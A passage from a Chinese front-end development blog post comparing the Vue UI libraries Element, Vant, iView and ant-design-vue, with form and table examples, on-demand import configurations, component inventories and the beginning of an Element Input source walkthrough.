class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">"close"</span>&gt;</span>Off<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">i-switch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Slider"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Slider</span> <span class="attr">v-model</span>=<span class="string">"formItem.slider"</span> <span class="attr">range</span>&gt;</span><span class="tag">&lt;/<span class="name">Slider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span> <span class="attr">label</span>=<span class="string">"Text"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Input</span> <span class="attr">v-model</span>=<span class="string">"formItem.textarea"</span> <span class="attr">type</span>=<span class="string">"textarea"</span> <span class="attr">:autosize</span>=<span class="string">"&#123;minRows: 2,maxRows: 5&#125;"</span> <span class="attr">placeholder</span>=<span class="string">"Enter something..."</span>&gt;</span><span class="tag">&lt;/<span class="name">Input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">FormItem</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Button</span> <span class="attr">style</span>=<span class="string">"margin-left: 8px"</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">FormItem</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ant-design-vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Fail"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"error"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">help</span>=<span class="string">"Should be combination of numbers &amp; alphabets"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"error"</span> <span class="attr">placeholder</span>=<span class="string">"unavailable choice"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Warning"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"warning"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"warning"</span> <span class="attr">placeholder</span>=<span class="string">"Warning"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Validating"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"validating"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">help</span>=<span class="string">"The information is being validated..."</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"validating"</span> <span class="attr">placeholder</span>=<span class="string">"I'm the content is being validated"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Success"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"success"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"success"</span> <span class="attr">placeholder</span>=<span class="string">"I'm the content"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Warning"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"warning"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"warning2"</span> <span class="attr">placeholder</span>=<span class="string">"Warning"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Fail"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"error"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">help</span>=<span class="string">"Should be combination of numbers &amp; alphabets"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span> <span class="attr">id</span>=<span class="string">"error2"</span> <span class="attr">placeholder</span>=<span class="string">"unavailable choice"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Success"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"success"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-date-picker</span> <span class="attr">style</span>=<span class="string">"width: 100%"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Warning"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"warning"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-time-picker</span> <span class="attr">style</span>=<span class="string">"width: 100%"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Error"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"error"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-select</span> <span class="attr">default-value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-select-option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">          Option 1</span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-select-option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-select-option</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">          Option 2</span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-select-option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-select-option</span> <span class="attr">value</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">          Option 3</span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-select-option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Validating"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"validating"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">help</span>=<span class="string">"The information is being validated..."</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-cascader</span> <span class="attr">:default-value</span>=<span class="string">"['1']"</span> <span class="attr">:options</span>=<span class="string">"[]"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"inline"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">"margin-bottom:0;"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">        <span class="attr">validate-status</span>=<span class="string">"error"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">help</span>=<span class="string">"Please select the correct date"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">:style</span>=<span class="string">"&#123; display: 'inline-block', width: 'calc(50% - 12px)' &#125;"</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-date-picker</span> <span class="attr">style</span>=<span class="string">"width: 100%"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">:style</span>=<span class="string">"&#123; display: 'inline-block', width: '24px', textAlign: 'center' &#125;"</span>&gt;</span></span><br><span class="line">        -</span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:style</span>=<span class="string">"&#123; display: 'inline-block', width: 'calc(50% - 12px)' &#125;"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-date-picker</span> <span class="attr">style</span>=<span class="string">"width: 100%"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:label-col</span>=<span class="string">"labelCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:wrapper-col</span>=<span class="string">"wrapperCol"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">label</span>=<span class="string">"Success"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">has-feedback</span></span></span><br><span class="line"><span class="tag">      <span class="attr">validate-status</span>=<span class="string">"success"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input-number</span> <span class="attr">style</span>=<span class="string">"width: 100%"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>form表单来看，使用基本上都差不多，但个人感觉iview和ant使用起来会更加的简洁一点（iView和ant更类似一点）。提供的一些参数和方法也都比较齐全和类似。</p>
</blockquote>
<ul>
<li>table<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- element --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">el-table</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:data</span>=<span class="string">"tableData"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">"width: 100%"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span></span></span><br><span class="line"><span class="tag">    <span class="attr">prop</span>=<span class="string">"date"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">label</span>=<span class="string">"日期"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span></span></span><br><span class="line"><span class="tag">    <span class="attr">prop</span>=<span class="string">"name"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">label</span>=<span class="string">"姓名"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">width</span>=<span class="string">"180"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">el-table-column</span></span></span><br><span class="line"><span class="tag">    <span class="attr">prop</span>=<span class="string">"address"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">label</span>=<span class="string">"地址"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- vant 无table（主要是移动端的UI）--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- iView --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Table</span> <span class="attr">:columns</span>=<span class="string">"columns1"</span> <span class="attr">:data</span>=<span class="string">"data1"</span>&gt;</span><span class="tag">&lt;/<span class="name">Table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ant-design-vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-table</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:columns</span>=<span class="string">"columns"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:rowKey</span>=<span class="string">"record =&gt; record.login.uuid"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:dataSource</span>=<span class="string">"data"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:pagination</span>=<span class="string">"pagination"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">:loading</span>=<span class="string">"loading"</span></span></span><br><span class="line"><span class="tag">    @<span class="attr">change</span>=<span class="string">"handleTableChange"</span></span></span><br><span class="line"><span class="tag">  &gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-table</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>table iview和ant 要比element 简洁许多。在生成类似表格 下拉框这些较复杂的组件时 ， iview 的方式类似于antdesign , 好处是直接传数据进去，在内部实现了模板生成，高效 快捷。 而element 则是用到到v-for vue指令结合的方式去生成，批量生成元素。</p>
</blockquote>
<h4 id="项目优化"><a href="#项目优化" class="headerlink" title="项目优化"></a>项目优化</h4><blockquote>
<p>第三方组件库依赖过大 会给首屏加载带来很大的压力，一般解决方式是 按需求引入组件， 只引入需要使用的组件。下面就简单介绍一下各个组件库按需引入的方式。</p>
</blockquote>
<ul>
<li><p>element</p>
<blockquote>
<p>借助 babel-plugin-component，只引入需要的组件，以达到减小项目体积的目的。安装依赖之后进行相应的配置。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* .babelrc */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"presets"</span>: [[<span class="string">"es2015"</span>, &#123; <span class="string">"modules"</span>: <span class="literal">false</span> &#125;]],</span><br><span class="line">  <span class="string">"plugins"</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">"component"</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"libraryName"</span>: <span class="string">"element-ui"</span>,</span><br><span class="line">        <span class="string">"styleLibraryName"</span>: <span class="string">"theme-chalk"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>vant</p>
<blockquote>
<p>使用babel-plugin-import 插件，它会在编译过程中将 import 的写法自动转换为按需引入的方式。安装依赖之后进行相应的配置。如果使用 TypeScript，可以使用 ts-import-plugin 实现按需引入。</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* .babelrc */</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"plugins"</span>: [</span><br><span class="line">    [<span class="string">"import"</span>, &#123;</span><br><span class="line">      <span class="string">"libraryName"</span>: <span class="string">"vant"</span>,</span><br><span class="line">      <span class="string">"libraryDirectory"</span>: <span class="string">"es"</span>,</span><br><span class="line">      <span class="string">"style"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>iView<blockquote>
<p>和vant相同，也是使用的babel-plugin-import。首先安装，并在文件 .babelrc 中配置：</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"plugins"</span>: [[<span class="string">"import"</span>, &#123;</span><br><span class="line">    <span class="string">"libraryName"</span>: <span class="string">"iview"</span>,</span><br><span class="line">    <span class="string">"libraryDirectory"</span>: <span class="string">"src/components"</span></span><br><span class="line">  &#125;]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ant-design-vue<blockquote>
<p>同样的也是使用的babel-plugin-import。首先安装，并在文件 .babelrc 中配置：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"plugins"</span>: [[<span class="string">"import"</span>, &#123;</span><br><span class="line">    <span class="string">"libraryName"</span>: <span class="string">"ant-design-vue"</span>,</span><br><span class="line">    <span class="string">"libraryDirectory"</span>: <span class="string">"es"</span>, </span><br><span class="line">    <span class="string">"style"</span>: <span class="string">"css"</span></span><br><span class="line">  &#125;]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<h4 id="针对对象"><a href="#针对对象" class="headerlink" title="针对对象"></a>针对对象</h4><blockquote>
<p>根据各个组件库官网的介绍，能够大概知道其各自对应的不同端<br>Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库<br>Vant Weapp 是移动端 Vue 组件库 Vant 的小程序版本，两者基于相同的视觉规范，提供一致的 API 接口，助力开发者快速搭建小程序应用。<br>View UI，即原先的 iView，是一套基于 Vue.js 的开源 UI 组件库，主要服务于 PC 界面的中后台产品。<br>ant-design-vue 开发和服务于企业级后台产品。</p>
</blockquote>
<h3 id="组件整理"><a href="#组件整理" class="headerlink" title="组件整理"></a>组件整理</h3><blockquote>
<p>组件整理主要是根据现有的比较成熟的组件库中已有的组件进行整理，主要分为了移动端和PC端两个部分。PC端主要是参考的element、iView、ant-design-vue，移动端主要是参考的vant。</p>
</blockquote>
<h4 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h4><blockquote>
<p>主要是参靠的vant组件库进行整理的。都是一些比较通用的组件，其中会包含一些移动端中常用到的组件，如下拉刷新、订单提交等</p>
</blockquote>
<p><strong>基础组件</strong></p>
<ul>
<li>Button 按钮</li>
<li>Cell 单元格</li>
<li>Icon 图标</li>
<li>Image 图片</li>
<li>Layout 布局</li>
<li>Popup 弹出层</li>
<li>Style 内置样式</li>
</ul>
<p><strong>表单组件</strong></p>
<ul>
<li>Calendar 日历</li>
<li>CheckBox 复选框</li>
<li>DateTimePicker 时间选择</li>
<li>Input 输入框</li>
<li>NumberKeyboard 数字键盘</li>
<li>PasswordInput 密码输入框</li>
<li>Picker 选择器</li>
<li>Radio 单选框</li>
<li>Rate 评分</li>
<li>Search 搜索</li>
<li>Slider 滑块</li>
<li>Stepper 步进器</li>
<li>Switch 开关</li>
<li>Upload 上传</li>
</ul>
<p><strong>反馈组件</strong></p>
<ul>
<li>ActionSheet 上拉菜单</li>
<li>Dialog 弹出框</li>
<li>DropdownMenu 下拉菜单</li>
<li>Loading 加载</li>
<li>Notify 消息通知</li>
<li>Overlay遮罩层</li>
<li>PullRefresh 下拉刷新</li>
<li>SwiperCell 滑动单元格</li>
<li>Toast 提示</li>
</ul>
<p><strong>展示组件</strong></p>
<ul>
<li>Circle 环形进度条</li>
<li>Collapse 折叠面板</li>
<li>CountDown 倒计时</li>
<li>Divider 分割线</li>
<li>ImagePreview 图片预览</li>
<li>LazyLoad 图片懒加载</li>
<li>List列表</li>
<li>NoticeBar 通知栏</li>
<li>Panel 面板</li>
<li>Progress 进度条</li>
<li>Skeleton 骨架屏</li>
<li>Steps 步骤条</li>
<li>Swiper 轮播</li>
<li>Tag 标记</li>
</ul>
<p><strong>导航组件</strong></p>
<ul>
<li>Grid 布局</li>
<li>NavBar 导航栏</li>
<li>Pagenation 分页</li>
<li>Sidebar 侧边导航</li>
<li>Tab 标签页</li>
<li>Tabbar 标签栏</li>
<li>TreeSelect 分类选择</li>
</ul>
<p><strong>业务组件</strong></p>
<ul>
<li>AddressEdit 地址编辑</li>
<li>AddressList 地址列表</li>
<li>Area 省市区选择</li>
<li>Card 商品卡片</li>
<li>Concat 联系人</li>
<li>SubmitBar 提交订单</li>
</ul>
<h4 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h4><blockquote>
<p>主要根据elementUi、ant-design-vue、iView来总结举例：</p>
</blockquote>
<p><strong>基础组件</strong></p>
<ul>
<li>Layout 布局</li>
<li>Container 布局容器</li>
<li>Color 颜色</li>
<li>Font 字体</li>
<li>Icon 图标</li>
<li>Button 按钮</li>
<li>Link 文字连接</li>
</ul>
<p><strong>表单元素</strong></p>
<ul>
<li>Radio 单选框</li>
<li>CheckBox 多选框</li>
<li>Input 输入框</li>
<li>InputNumber 计时器</li>
<li>Select 选择器</li>
<li>Cascader 级联选择器</li>
<li>Switch 开关</li>
<li>Slider 滑块</li>
<li>AutoComplete 自动完成</li>
<li>TimePicker 时间选择器</li>
<li>DatePicker 日期选择器</li>
<li>DateTimePicker 日期时间选择器</li>
<li>Upload 上传</li>
<li>Rate 评分</li>
<li>ColorPicker 颜色选择器</li>
<li>Transfer 穿梭框</li>
<li>Form 表单</li>
</ul>
<p><strong>数据组件</strong></p>
<ul>
<li>Table 表格</li>
<li>Tag 标签</li>
<li>Progress 进度条</li>
<li>Tree 树形控件</li>
<li>Pagenation 分页</li>
<li>Badge 标记</li>
<li>Avatar 头像</li>
<li>Statistic 统计数值</li>
</ul>
<p><strong>通知组件</strong></p>
<ul>
<li>Alert 警告</li>
<li>Loading 加载</li>
<li>Message 消息提示</li>
<li>MessageBox 弹窗</li>
<li>Notification 通知</li>
</ul>
<p><strong>导航</strong></p>
<ul>
<li>NavMenu 导航菜单</li>
<li>Tabs 标签页</li>
<li>Breadcrumb 面包屑</li>
<li>PageHeader 页头</li>
<li>DropDown 下拉菜单</li>
<li>Steps 步骤条</li>
</ul>
<p><strong>其他</strong></p>
<ul>
<li>Dialog 对话框</li>
<li>Tooltip 文字提示</li>
<li>Skeleton 骨架屏</li>
<li>Popover 弹出框</li>
<li>Popconfirm 气泡确认框</li>
<li>Card 卡片</li>
<li>Anchor 锚点</li>
<li>Split 面板分割</li>
<li>Affix 图钉</li>
<li>Carousel 走马灯</li>
<li>Comment 评论</li>
<li>Empty 空状态</li>
<li>Collapse 折叠面板</li>
<li>Timeline 时间线</li>
<li>Time 相对时间</li>
<li>Divider 分割线</li>
<li>Calendar 日历</li>
<li>Image 图片</li>
<li>Backtop 回到顶部</li>
<li>InfiniteScroll 无限滚动</li>
<li>Drawer 抽屉</li>
</ul>
<h3 id="组件初步学习"><a href="#组件初步学习" class="headerlink" title="组件初步学习"></a>组件初步学习</h3><blockquote>
<p>这里主要是参考的elementUi的源码来进行相应的分析和学习的。</p>
</blockquote>
<h4 id="elementUi源码"><a href="#elementUi源码" class="headerlink" title="elementUi源码"></a>elementUi源码</h4><blockquote>
<p>通过官网进入elementUi的github，相应的组件放在packages目录中。<br><img src="/images/elgithub.png" alt="Image"></p>
</blockquote>
<h4 id="详情分析"><a href="#详情分析" class="headerlink" title="详情分析"></a>详情分析</h4><ul>
<li>Input组件分析<blockquote>
<p>相应的源码如下，通过源码能看到就一个Input组件中，已经包含了很多的props了。所以，我们在编写一个组件之前需要提前设计和讨论该组件所需要暴露出的功能点，或者提前设计好相应的功能补充的接口。</p>
</blockquote>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"[</span></span><br><span class="line"><span class="string">    type === 'textarea' ? 'el-textarea' : 'el-input',</span></span><br><span class="line"><span class="string">    inputSize ? 'el-input--' + inputSize : '',</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      'is-disabled': inputDisabled,</span></span><br><span class="line"><span class="string">      'is-exceed': inputExceed,</span></span><br><span class="line"><span class="string">      'el-input-group': $slots.prepend || $slots.append,</span></span><br><span class="line"><span class="string">      'el-input-group--append': $slots.append,</span></span><br><span class="line"><span class="string">      'el-input-group--prepend': $slots.prepend,</span></span><br><span class="line"><span class="string">      'el-input--prefix': $slots.prefix || prefixIcon,</span></span><br><span class="line"><span class="string">      'el-input--suffix': $slots.suffix || suffixIcon || clearable || showPassword</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ]"</span></span><br><span class="line">    @mouseenter=<span class="string">"hovering = true"</span></span><br><span class="line">    @mouseleave=<span class="string">"hovering = false"</span></span><br><span class="line">  &gt;</span><br><span class="line">    &lt;template v-<span class="keyword">if</span>=<span class="string">"type !== 'textarea'"</span>&gt;</span><br><span class="line">      &lt;!-- 前置元素 --&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"el-input-group__prepend"</span> v-<span class="keyword">if</span>=<span class="string">"$slots.prepend"</span>&gt;</span><br><span class="line">        &lt;slot name=<span class="string">"prepend"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line">      